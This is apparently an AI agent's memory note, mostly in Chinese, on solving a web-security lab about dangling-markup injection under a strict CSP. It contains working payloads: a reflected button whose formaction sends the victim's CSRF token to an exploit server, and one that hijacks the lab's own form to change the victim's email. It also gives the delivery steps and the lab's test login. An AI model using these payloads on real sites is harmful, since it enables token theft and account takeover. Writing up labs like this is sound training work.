---
metadata:
  node_type: memory
name: "PRS arm A lab-very-strict-csp-with-dangling-markup-attack"
description: "arm A 基线:lab-very-strict-csp-with-dangling-markup-attack 冷实例(reused:false)解到 congrats - /my-account?email= 未转义反射进 email input 值,formaction 到 exploit server 取 victim 令牌(会话绑定),改由 victim 浏览器同源提交 --button formnovalidate 完成改邮箱"
last_updated: 2026-10-09T02:15:30+08:00
created: 2026-10-09T02:15:30+08:00
---

## 2026-10-09 arm A 基线 lab-very-strict-csp-with-dangling-markup-attack

实例: `range_launch launch-url /web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack`(reused:false,jar /tmp/cj1.json)。终态 banner `is-solved` + "Congratulations, you solved the lab!"。

### 注入点(参数扫描定位)
- CSP(无 form-action): `default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none'` ⇒ 外链子资源全封、内联脚本封,但 **表单跨源提交允许**(form-action 不回落 default-src)。
- 反射点 = `/my-account?email=<raw>`:email 值**未转义**写进 change-email 表单的 `<input type="email" name="email" value="...">`;`"` `<` `>` 均原样(+12 字节实测)。无会话时 302 /login,/login 不读该参数。
- 其他面均非向量:`/?search=` 等 33 个参数全无回显(首页无 search 表单);`/post?postId=` 非法值回 JSON;`/post/comment/confirmation?postId=` 是**转义**的(href 里 &quot;),不是本题口子。
- 定位手法:`cache_probe` 多参数同 payload 扫 `/my-account`,按 body_len 与基线 3707 的差值抓出唯一异常项(email,+5)⇒ 比逐个 http_dump 省轮次。

### 攻击链(两步验证 + 最终解法)
1. 取令牌(已完成):payload `x@x.com"><button formaction="https://exploit-<id>.exploit-server.net/exploit" formmethod="get" formnovalidate>Click me</button>`;exploit 页 `location='https://LAB/my-account?email='+encodeURIComponent(同上)`。victim(UA `Mozilla/5.0 (Victim) ... Chrome/154`)点按钮 ⇒ 应用自带表单(email+csrf)按 GET 提交到 exploit server,访问日志得 `GET /exploit?email=x%40x.com&csrf=<victim token>` = 令牌外带成功。
2. 令牌**会话绑定**:拿 victim 的 csrf 配自己的 session POST /my-account/change-email ⇒ 400 `"Invalid CSRF token"`。改邮箱只能由 victim 自己的浏览器做。
3. 终解(同源表单劫持):payload `hacker@evil-user.net"><button formnovalidate>Click me</button>` — 值预填目标邮箱,按钮无 formaction 即走应用自身 action `/my-account/change-email`,victim 一点即用**自己的会话+自己的令牌**改掉自己的邮箱 ⇒ solved。"exfiltrate 令牌"由第 1 步独立达成(日志为证)。

### 坑
- exploit 页脚本在 head 执行:`document.body` 为 null,`appendChild` 抛错 → 自动提交静默失败;须 `document.body||document.documentElement`。
- 从 exploit 页自动 POST 到 lab(跨源)不生效(仍不 solved)⇒ 改邮箱别跨源,交回 lab 页内同源按钮。
- victim bot 是**循环**的:反复 `GET /exploit/` → 跳 lab → 点 "Click me",约 3.5s 一轮;投递常落在轮次中间,同一 payload 复投一次才命中。
- 投递通道:raw `http_session post` 带 `formAction=DELIVER_TO_VICTIM` 两次都没唤来 victim;经 exploit server UI(浏览器点 Deliver)一次即来。用 `page_interact <exploit-url> --driver '<填 textarea + click button[value=DELIVER_TO_VICTIM]>'` 一步完成 store+deliver。
- 自测:`page_interact <lab>/login --fill 'input[name=username]~wiener;input[name=password]~peter' --click 'button[type=submit]'` 把浏览器登进 lab,可端到端复现/验证点击链。

